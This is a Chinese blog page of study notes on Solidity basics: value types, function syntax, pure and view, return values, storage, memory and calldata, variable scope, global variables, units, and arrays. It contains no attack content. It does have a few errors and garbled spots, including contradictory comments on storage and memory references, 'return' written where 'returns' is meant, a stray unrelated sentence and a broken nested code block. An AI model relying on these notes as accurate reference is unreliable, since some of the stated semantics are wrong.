<code>_bool</code> 的非，为 <code>false</code>；<code>_bool &amp;&amp; _bool1</code> 为 <code>false</code>；<code>_bool || _bool1</code> 为 <code>true</code>；<code>_bool == _bool1</code> 为 <code>false</code>；<code>_bool != _bool1</code> 为 <code>true</code>。</p><p><strong>值得注意的是：</strong><code>&amp;&amp;</code> 和 <code>||</code> 运算符遵循短路规则，这意味着，假如存在 <code>f(x) || g(y)</code> 的表达式，如果 <code>f(x)</code> 是 <code>true</code>，<code>g(y)</code> 不会被计算，即使它和 <code>f(x)</code> 的结果是相反的。假如存在<code>f(x) &amp;&amp; g(y)</code> 的表达式，如果 <code>f(x)</code> 是 <code>false</code>，<code>g(y)</code> 不会被计算。 所谓“短路规则”，一般出现在逻辑与（&amp;&amp;）和逻辑或（||）中。 当逻辑与（&amp;&amp;）的第一个条件为false时，就不会再去判断第二个条件； 当逻辑或（||）的第一个条件为true时，就不会再去判断第二个条件，这就是短路规则。</p><h3 id="2-整型"><a href="#2-整型" class="headerlink" title="2. 整型"></a>2. 整型</h3><p>整型是 Solidity 中的整数，最常用的包括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 整型<br>int public _int = -1; // 整数，包括负数<br>uint public _uint = 1; // 无符号整数<br>uint256 public _number = 20220330; // 256位无符号整数<br></code></pre></td></tr></table></figure><p>常用的整型运算符包括：</p><ul><li>比较运算符（返回布尔值）： <code>&lt;=</code>， <code>&lt;</code>，<code>==</code>， <code>!=</code>， <code>&gt;=</code>， <code>&gt;</code></li><li>算术运算符： <code>+</code>， <code>-</code>， <code>*</code>， <code>/</code>， <code>%</code>（取余），<code>**</code>（幂）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 整数运算<br>uint256 public _number1 = _number + 1; // +，-，*，/<br>uint256 public _number2 = 2**2; // 指数<br>uint256 public _number3 = 7 % 2; // 取余数<br>bool public _numberbool = _number2 &gt; _number3; // 比大小<br></code></pre></td></tr></table></figure><p>大家可以运行一下代码，看看这 4 个变量分别是多少。</p><h3 id="3-地址类型"><a href="#3-地址类型" class="headerlink" title="3. 地址类型"></a>3. 地址类型</h3><p>地址类型有两类：</p><ul><li>普通地址: 存储一个 20 字节的值（以太坊地址的大小）。</li><li>Payable address ：比普通地址多了<code>transfer</code>和<code>send</code>两个成员方法，用于接收转账。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 地址<br>address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;<br>address payable public _address1 = payable(_address); // payable address，可以转账、查余额<br>// 地址类型的成员<br>uint256 public balance = _address1.balance; // balance of address<br></code></pre></td></tr></table></figure><h3 id="4-定长字节数组"><a href="#4-定长字节数组" class="headerlink" title="4. 定长字节数组"></a>4. 定长字节数组</h3><p>字节数组氛围定长和不定长两种</p><ul><li>定长字节数组：属于值类型，数组长度在声明之后不能改变。根据字节数组的长度分为 <code>bytes1</code>, <code>bytes8</code>, <code>bytes32</code> 等类型。定长字节数组最多存储 32 bytes 数据，即<code>bytes32</code>。</li><li><strong>不定长字节数组</strong>: 属于引用类型（之后的章节介绍），数组长度在声明之后可以改变，包括 <code>bytes</code> 等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 固定长度的字节数组<br>bytes32 public _byte32 = &quot;MiniSolidity&quot;; // 字节形式<br>bytes1 public _byte = _byte32[0]; // 取其第一个字节<br></code></pre></td></tr></table></figure><p>在上述代码中，字符串 <code>MiniSolidity</code> 以字节的方式存储进变量 <code>_byte32</code>。如果把它转换成 <code>16 进制</code>，就是：<code>0x4d696e69536f6c69646974790000000000000000000000000000000000000000</code></p><p><code>_byte</code> 变量的值为 <code>_byte32</code> 的第一个字节，即 <code>0x4d</code>。</p><h3 id="5-枚举-enum"><a href="#5-枚举-enum" class="headerlink" title="5. 枚举 enum"></a>5. 枚举 enum</h3><p>枚举（<code>enum</code>）是 Solidity 中用户定义的数据类型。它主要用于为 <code>uint</code> 分配名称，使程序易于阅读和维护。它与 <code>C 语言</code> 中的 <code>enum</code> 类似，使用名称来代替从 <code>0</code> 开始的 <code>uint</code>：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fortran">// 用<span class="hljs-keyword">enum</span>将uint <span class="hljs-number">0</span>， <span class="hljs-number">1</span>， <span class="hljs-number">2</span>表示为Buy, Hold, Sell<br><span class="hljs-keyword">enum</span> ActionSet &#123; Buy, Hold, Sell &#125;<br>// 创建<span class="hljs-keyword">enum</span>变量 <span class="hljs-keyword">action</span><br>ActionSet <span class="hljs-keyword">action</span> = ActionSet.Buy;<br></code></pre></td></tr></table></figure><p>枚举可以显式地和 <code>uint</code> 相互转换，并会检查转换的无符号整数是否在枚举的长度内，否则会报错：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// enum可以和uint显式的转换</span><br>function <span class="hljs-built_in">enumToUint</span>() external view <span class="hljs-built_in">returns</span>(uint)&#123;<br>    return <span class="hljs-built_in">uint</span>(action);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>enum</code> 是一个比较冷门的数据类型，几乎没什么人用。</strong></p><h1 id="3-函数"><a href="#3-函数" class="headerlink" title="3. 函数"></a>3. 函数</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>我们先看一下 Solidity 中函数的形式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function &lt;function name&gt;([parameter types[, ...]]) &#123;internal|external|public|private&#125; [pure|view|payable] [virtual|override] [&lt;modifiers&gt;]<br>[returns (&lt;return types&gt;)]&#123; &lt;function body&gt; &#125;<br></code></pre></td></tr></table></figure><p>看着有一些复杂，让我们从前往后逐个解释(方括号中的是可写可不 写的关键字)：</p><ol><li><p><code>function</code>：声明函数时的固定用法。要编写函数，就需要以 <code>function</code> 关键字开头。</p></li><li><p><code>&lt;function name&gt;</code>：函数名。</p></li><li><p><code>([parameter types[, ...]])</code>：圆括号内写入函数的参数，即输入到函数的变量类型和名称。</p></li><li><p><code>&#123;internal|external|public|private&#125;</code>：函数可见性说明符，共有4种。</p><ul><li><code>public</code>：内部和外部均可见。</li><li><code>private</code>：只能从本合约内部访问，继承的合约也不能使用。</li><li><code>external</code>：只能从合约外部访问（但内部可以通过 <code>this.f()</code> 来调用，<code>f</code>是函数名）。</li><li><code>internal</code>: 只能从合约内部访问，继承的合约可以用。</li></ul><p><strong>注意 1</strong>：合约中定义的函数需要明确指定可见性，它们没有默认值。</p><p><strong>注意 2</strong>：<code>public|private|internal</code> 也可用于修饰状态变量(定义可参考<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/03_Function/[../05_DataStorage/readme.md#1-%E7%8A%B6%E6%80%81%E5%8F%98%E9%87%8F](https:/github.com/AmazingAng/WTF-Solidity/tree/main/05_DataStorage#1-%E7%8A%B6%E6%80%81%E5%8F%98%E9%87%8F)">WTF Solidity 第5讲的相关内容</a>)。<code>public</code>变量会自动生成同名的<code>getter</code>函数，用于查询数值。未标明可见性类型的状态变量，默认为<code>internal</code>。</p></li><li><p><code>[pure|view|payable]</code>：决定函数权限&#x2F;功能的关键字。<code>payable</code>（可支付的）很好理解，带着它的函数，运行的时候可以给合约转入 ETH。<code>pure</code> 和 <code>view</code> 的介绍见下一节。</p></li><li><p><code>[virtual|override]</code>: 方法是否可以被重写，或者是否是重写方法。<code>virtual</code>用在父合约上，标识的方法可以被子合约重写。<code>override</code>用在子合约上，表名方法重写了父合约的方法。</p></li><li><p><code>&lt;modifiers&gt;</code>: 自定义的修饰器，可以有0个或多个修饰器。</p></li><li><p><code>[returns ()]</code>：函数返回的变量类型和名称。</p></li><li><p><code>&lt;function body&gt;</code>: 函数体。</p></li></ol><h2 id="到底什么是-Pure-和View？"><a href="#到底什么是-Pure-和View？" class="headerlink" title="到底什么是 Pure 和View？"></a>到底什么是 <code>Pure</code> 和<code>View</code>？</h2><p>刚开始学习 <code>solidity</code> 时，<code>pure</code> 和 <code>view</code> 关键字可能令人费解，因为其他编程语言中没有类似的关键字。<code>solidity</code> 引入这两个关键字主要是因为 以太坊交易需要支付气费（gas fee）。合约的状态变量存储在链上，gas fee 很贵，如果计算不改变链上状态，就可以不用付 <code>gas</code>。包含 <code>pure</code> 和 <code>view</code> 关键字的函数是不改写链上状态的，因此用户直接调用它们是不需要付 gas 的（注意，合约中非 <code>pure</code>&#x2F;<code>view</code> 函数调用 <code>pure</code>&#x2F;<code>view</code> 函数时需要付gas）。</p><p>在以太坊中，以下语句被视为修改链上状态：</p><ol><li>写入状态变量。</li><li>释放事件。</li><li>创建其他合约。</li><li>使用 <code>selfdestruct</code>.</li><li>通过调用发送以太币。</li><li>调用任何未标记 <code>view</code> 或 <code>pure</code> 的函数。</li><li>使用低级调用（low-level calls）。</li><li>使用包含某些操作码的内联汇编。</li></ol><ul><li><code>pure</code>，中文意思是“纯”，这里可以理解为”纯打酱油的”。<code>pure</code> 函数既不能读取也不能写入链上的状态变量。就像小怪一样，看不到也摸不到碧琪公主。</li><li><code>view</code>，“看”，这里可以理解为“看客”。<code>view</code>函数能读取但也不能写入状态变量。类似马里奥，能看到碧琪公主，但终究是看客，不能入洞房。</li><li>非 <code>pure</code> 或 <code>view</code> 的函数既可以读取也可以写入状态变量。类似马里奥里的 <code>boss</code>，可以对碧琪公主为所欲为🐶。</li></ul><h1 id="4-函数输出"><a href="#4-函数输出" class="headerlink" title="4. 函数输出"></a>4. 函数输出</h1><h2 id="返回值：return-和-returns"><a href="#返回值：return-和-returns" class="headerlink" title="返回值：return 和 returns"></a>返回值：return 和 returns</h2><p>在函数定义行中有两个关键字<code>return</code>和<code>returns</code>，他们区别是：</p><ul><li><code>return</code>跟在函数名后面，用于声明返回的变量类型以及变量名称</li><li><code>return</code>:用于函数主题中，返回指定的变量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 返回多个变量<br>function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;<br>    return(1, true, [uint256(1),2,5]);<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述代码中，我们利用 <code>returns</code> 关键字声明了有多个返回值的 <code>returnMultiple()</code> 函数，然后我们在函数主体中使用 <code>return(1, true, [uint256(1),2,5])</code> 确定了返回值。</p><p>这里<code>uint256[3]</code>声明了一个长度为<code>3</code>且类型为<code>uint256</code>的数组作为返回值。因为<code>[1,2,3]</code>会默认为<code>uint8(3)</code>，因此<code>[uint256(1),2,5]</code>中首个元素必须强转</p><h2 id="命名式返回"><a href="#命名式返回" class="headerlink" title="命名式返回"></a>命名式返回</h2><p>我们可以在 <code>returns</code> 中标明返回变量的名称。Solidity 会初始化这些变量，并且自动返回这些变量的值，无需使用 <code>return</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 命名式返回<br>function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;<br>    _number = 2;<br>    _bool = false;<br>    _array = [uint256(3),2,1];<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述代码中，我们用 <code>returns(uint256 _number, bool _bool, uint256[3] memory _array)</code> 声明了返回变量类型以及变量名。这样，在主体中只需为变量 <code>_number</code>、<code>_bool</code>和<code>_array</code> 赋值，即可自动返回。</p><p>当然，你也可以在命名式返回中用 <code>return</code> 来返回变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 命名式返回，依然支持return<br>function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;<br>    return(1, true, [uint256(1),2,5]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="解构式赋值"><a href="#解构式赋值" class="headerlink" title="解构式赋值"></a>解构式赋值</h2><p>Solidity 支持使用解构式赋值规则来读取函数的全部或部分返回值。</p><ul><li><p>读取所有返回值：声明变量，然后将要赋值的变量用<code>,</code>隔开，按顺序排列。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 _number;<br>bool _bool;<br>uint256[3] memory _array;<br>(_number, _bool, _array) = returnNamed();<br></code></pre></td></tr></table></figure></li><li><p>读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。在下面的代码中，我们只读取<code>_bool</code>，而不读取返回的<code>_number</code>和<code>_array</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(, _bool2, ) = returnNamed();<br></code></pre></td></tr></table></figure></li></ul><p>如果两个币种发生较大汇率的变化就会有损失</p><h1 id="5-变量数据存储和作用域"><a href="#5-变量数据存储和作用域" class="headerlink" title="5. 变量数据存储和作用域"></a>5. 变量数据存储和作用域</h1><p>引用类型(Reference Type) ：包括数组(array)和结构体(struct)，由于这类变量的类型比较复杂且占用空间比较大，所以使用的时候必须要声明数据所存储的位置，</p><h2 id="数据位置"><a href="#数据位置" class="headerlink" title="数据位置"></a>数据位置</h2><p>数据的位置包含三种类型<code>storage</code>,<code>memory</code>,<code>calldata</code></p><ul><li><p><code>storage</code>：合约里的状态变量默认是storage，存储在链上的，类似计算机的硬盘—一种持久化存储，由链帮你持久化，所以影响了链，所以消耗的gas比较大</p></li><li><p><code>memory</code>:函数里的参数和临时使用的变量一般用memory，见名知意，内存，存储在内存中的，不上链，尤其是当返回数据类型是<strong>变长</strong>的情况下，必须加memory修饰，例如：string,bytes，array和自定义结构，</p></li><li><p><code>calldata</code>：和<code>memory</code>类似，也是储存在内存中，不上链，不同点是不能修寒这个变量，一般用于函数的参数，入参进来后不会被改变：如</p></li><li><pre><code class="solidity">function fCallData(uint[] calldata _x)public pure returns (uint[] calldata) &#123;        // _x[0]=0; // 当你修改的时候，就会报错TypeError: Calldata arrays are read-only.        return (_x);    &#125;<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br><span class="hljs-meta">### 数据位置和赋值规则</span><br><br>赋值的本质是创建引用指向本土，因此修改本体或者是修改引用，变化可以被同步<br><br>- `storage`(合约的状态变量)赋值给本地`storage`（函数里的）时候，会创建引用，改变新变量会影响原来的变量。例如a<br><br>```solidity<br>    <span class="hljs-built_in">uint</span>[] x =[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br>    <span class="hljs-function">function <span class="hljs-title">sStorage</span>() <span class="hljs-keyword">public</span></span> &#123;<br>        <span class="hljs-built_in">uint</span>[] storage xStorage = x; <span class="hljs-comment">// xStorage是uint[]类型，位置是storage，引用了x，当修改xStorage的时候，x也会被修改，</span><br>        xStorage[<span class="hljs-number">0</span>]=<span class="hljs-number">101</span>;<span class="hljs-comment">//当我们调用了Sstorage方法的时候就xStorage以及x的第1个元素改成100，</span><br>        <span class="hljs-comment">// 在debug的时候可以看到x的第1个元素一开是1 ，后面变成了100</span><br>        <br>    &#125;<br>    <span class="hljs-comment">// 为了更方便观察。写了一个getX方法来查询x的值，当调用了sStorage后x的第一个元素就变成了101了；</span><br>    <span class="hljs-function">function <span class="hljs-title">getX</span>() <span class="hljs-keyword">public</span> view <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint</span>[] memory</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (x);<br>    &#125;<br></code></pre></td></tr></table></figure></code></pre></li><li><p><code>memory</code>赋值给<code>memory</code>，会创建引用，改变新变量会影响原变量。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity"><br>uint[] y  =[1,2,3]; // 在函数之外定义的变量，默认就是stroage类型的，<br><br><br>function yMemory() public view &#123;<br>    uint[] memory ymemory = y; // y是storage类的，ymemory是引用了y，所以修改ymemory的时候不会修改到y<br>    ymemory[0]=101;<br>    <br>&#125;<br>// 我们调用getY的时候就会发现，其实yMemory方法并不能修改y的值，这就是引用<br>function getY() public view returns (uint[] memory)&#123;<br>    return (y);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>其他情况下，赋值创建的是本体的副本，即对二者之一的修改，并不会同步到另一方。这有时会涉及到开发中的问题，比如从<code>storage</code>中读取数据，赋值给<code>memory</code>，然后修改<code>memory</code>的数据，但如果没有将<code>memory</code>的数据赋值回<code>storage</code>，那么<code>storage</code>的数据是不会改变的。上面的例子就是指的其他情况，是storage 类型被memory类型改变，实际是改变不成功的</li><li>还有一种情况就是memory类型的被memory类型的修改，这个暂时还不知道怎么打印</li></ul><h2 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h2><p>前面收的storage和memory讨论的是变量存储的位置，以及引用的方式，就像理解指针和引用一样，下面来学变量的作用域，所谓所用域就是指这个变量在哪里可以用它</p><p><code>Solidity</code>中变量按作用域划分有三种，分别是状态变量（state variable），局部变量（local variable）和全局变量(global variable)</p><h3 id="1-状态变量"><a href="#1-状态变量" class="headerlink" title="1. 状态变量"></a>1. 状态变量</h3><p>状态变量是数据存储在链上的变量，所有合约内函数都可以访问，<code>gas</code>消耗高。状态变量在合约内、函数外声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Variables &#123;<br>     // 2.变量的作用域<br>    // 2.1 状态变量： 链上的变量：写在合约里面函数外面的变量，就是状态变量，在所有合约内函数都可以访问，同样gas的消耗也高<br>    uint public a=1;<br>    uint public b;<br>    string public z;// 这些变量都是状态变量，同时，这些变量会自带有get方法去查看他们的值，（数组没有自带get）<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以在函数里更改状态变量的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function foo() external&#123;<br>    // 可以在函数里更改状态变量的值<br>    x = 5;<br>    y = 2;<br>    z = &quot;0xAA&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2. 局部变量"></a>2. 局部变量</h3><p>局部变量是仅在函数执行过程中有效的变量，函数退出后，变量无效。局部变量的数据存储在内存里，不上链，<code>gas</code>低。局部变量在函数内声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity"> // 2.2 局部变量，这个就很好理解了，就是在函数内部定义的变量，只作用的函数内，出去了就没用啦<br>function bar() external pure returns(uint)&#123;<br>    uint xx = 1;<br>    uint yy = 3;<br>    uint zz = xx + yy;<br>    return(zz);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-全局变量"><a href="#3-全局变量" class="headerlink" title="3. 全局变量"></a>3. 全局变量</h3><p>全局变量是全局范围工作的变量，都是<code>solidity</code>预留关键字。他们可以在函数内不声明直接使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 2.3 全局变量，这里的全局变量和py不同，这里指的是solidity预留关键字的变量，他们可以在函数内不声明直接使用<br>   function global()external view returns(address,uint,bytes32,bytes memory)  &#123;<br>       address sender=msg.sender; // 发送者的地址，猜测应该是调用这个合约的人的地址,address是一种类型<br>       uint blockNum = block.number; // 当前区块高度？<br>       bytes32 bHash = blockhash(blockNum - 1); // 获取区块哈希<br>       bytes memory data=msg.data; //这个没用过 ,byte是类型，memory是位置<br>       return (sender,blockNum,bHash,data);<br>   &#125;<br></code></pre></td></tr></table></figure><p>下面是一些常用的全局变量，更完整的列表请看这个<a href="https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions">链接</a>：</p><ul><li><code>blockhash(uint blockNumber)</code>: (<code>bytes32</code>) 给定区块的哈希值 – 只适用于最近的256个区块, 不包含当前区块。</li><li><code>block.coinbase</code>: (<code>address payable</code>) 当前区块矿工的地址</li><li><code>block.gaslimit</code>: (<code>uint</code>) 当前区块的gaslimit</li><li><code>block.number</code>: (<code>uint</code>) 当前区块的number</li><li><code>block.timestamp</code>: (<code>uint</code>) 当前区块的时间戳，为unix纪元以来的秒</li><li><code>gasleft()</code>: (<code>uint256</code>) 剩余 gas</li><li><code>msg.data</code>: (<code>bytes calldata</code>) 完整call data</li><li><code>msg.sender</code>: (<code>address payable</code>) 消息发送者 (当前 caller)</li><li><code>msg.sig</code>: (<code>bytes4</code>) calldata的前四个字节 (function identifier)</li><li><code>msg.value</code>: (<code>uint</code>) 当前交易发送的 <code>wei</code> 值</li><li><code>block.blobbasefee</code>: (<code>uint</code>) 当前区块的blob基础费用。这是Cancun升级新增的全局变量。</li><li><code>blobhash(uint index)</code>: (<code>bytes32</code>) 返回跟当前交易关联的第 <code>index</code> 个blob的版本化哈希（第一个字节为版本号，当前为<code>0x01</code>，后面接KZG承诺的SHA256哈希的最后31个字节）。若当前交易不包含blob，则返回空字节。这是Cancun升级新增的全局变量。</li></ul><h3 id="4-全局变量-以太单位与时间单位"><a href="#4-全局变量-以太单位与时间单位" class="headerlink" title="4. 全局变量-以太单位与时间单位"></a>4. 全局变量-以太单位与时间单位</h3><h4 id="以太单位"><a href="#以太单位" class="headerlink" title="以太单位"></a>以太单位</h4><p><code>Solidity</code>中不存在小数点，以<code>0</code>代替为小数点，来确保交易的精确度，并且防止精度的损失，利用以太单位可以避免误算的问题，方便程序员在合约中处理货币交易。</p><ul><li><code>wei</code>: 1</li><li><code>gwei</code>: 1e9 &#x3D; 1000000000</li><li><code>ether</code>: 1e18 &#x3D; 1000000000000000000</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 以太坊没有小数点，用0代替为小数点来确保交易的精度，为了防止精度的损失，利用一台单位可以避免误算，<br>  // wei : 1<br>  // gwei : 1e9 =1000000000<br>  // ether : 1e18 = 100000000000000000<br>  function weiUit()external pure returns(uint)  &#123;<br>      assert(1 wei ==1e0);<br>      assert(1 wei == 1);<br>      // return 1 wei; // 调用的时候就看到返回了1，<br>      return 1 gwei; // 试试看返回什么 返回 <br>  &#125;<br>  function gweiUit()external pure returns(uint)  &#123;<br>      assert(1 gwei ==1e9);<br>      assert(1 gwei == 1000000000); // 如果assert错误，调用的时候会报错的嘿嘿<br>      <br>      return 1 gwei; // 试试看返回什么 返回  1000000000<br>  &#125;<br>  function etherUit()external pure returns(uint)  &#123;<br>      assert(1 ether ==1e18);<br>      assert(1 ether == 1000000000000000000);<br>      // return 1 wei; // 调用的时候就看到返回了1，<br>      return 1 ether; // 试试看返回什么 返回  1000000000000000000<br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="时间单位"><a href="#时间单位" class="headerlink" title="时间单位"></a>时间单位</h4><p>可以在合约中规定一个操作必须在一周内完成，或者某个事件在一个月后发生。这样就能让合约的执行可以更加精确，不会因为技术上的误差而影响合约的结果。因此，时间单位在<code>Solidity</code>中是一个重要的概念，有助于提高合约的可读性和可维护性。</p><ul><li><code>seconds</code>: 1</li><li><code>minutes</code>: 60 seconds &#x3D; 60</li><li><code>hours</code>: 60 minutes &#x3D; 3600</li><li><code>days</code>: 24 hours &#x3D; 86400</li><li><code>weeks</code>: 7 days &#x3D; 604800</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function secondsUnit() external pure returns(uint) &#123;<br>    assert(1 seconds == 1);<br>    return 1 seconds;<br>&#125;<br><br>function minutesUnit() external pure returns(uint) &#123;<br>    assert(1 minutes == 60);<br>    assert(1 minutes == 60 seconds);<br>    return 1 minutes;<br>&#125;<br><br>function hoursUnit() external pure returns(uint) &#123;<br>    assert(1 hours == 3600);<br>    assert(1 hours == 60 minutes);<br>    return 1 hours;<br>&#125;<br><br>function daysUnit() external pure returns(uint) &#123;<br>    assert(1 days == 86400);<br>    assert(1 days == 24 hours);<br>    return 1 days;<br>&#125;<br><br>function weeksUnit() external pure returns(uint) &#123;<br>    assert(1 weeks == 604800);<br>    assert(1 weeks == 7 days);<br>    return 1 weeks;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这一讲，我们介绍了<code>Solidity</code>中的引用类型，数据位置和变量的作用域。重点是<code>storage</code>, <code>memory</code>和<code>calldata</code>三个关键字的用法。他们出现的原因是为了节省链上有限的存储空间和降低<code>gas</code>。下一讲我们会介绍引用类型中的数组。</p><h1 id="6-引用类型-array-struct"><a href="#6-引用类型-array-struct" class="headerlink" title="6. 引用类型, array, struct"></a>6. 引用类型, array, struct</h1><p>数组（<code>Array</code>）是<code>Solidity</code>常用的一种变量类型，用来存储一组数据（整数，字节，地址等等）。数组分为固定长度数组和可变长度数组两种：</p><ul><li><p>固定长度数组：在声明时指定数组的长度。用<code>T[k]</code>的格式声明，其中<code>T</code>是元素的类型，<code>k</code>是长度，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 固定长度 Array<br>uint[8] array1;<br>bytes1[5] array2;<br>address[100] array3;<br></code></pre></td></tr></table></figure></li><li><p>可变长度数组（动态数组）：在声明时不指定数组的长度。用<code>T[]</code>的格式声明，其中<code>T</code>是元素的类型，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 可变长度 Array<br>uint[] array4;<br>bytes1[] array5;<br>address[] array6;<br>bytes array7;<br></code></pre></td></tr></table></figure><p><strong>注意</strong>：<code>bytes</code>比较特殊，是数组，但是不用加<code>[]</code>。另外，不能用<code>byte[]</code>声明单字节数组，可以使用<code>bytes</code>或<code>bytes1[]</code>。<code>bytes</code> 比 <code>bytes1[]</code> 省gas。</p></li></ul><h3 id="创建数组的规则"><a href="#创建数组的规则" class="headerlink" 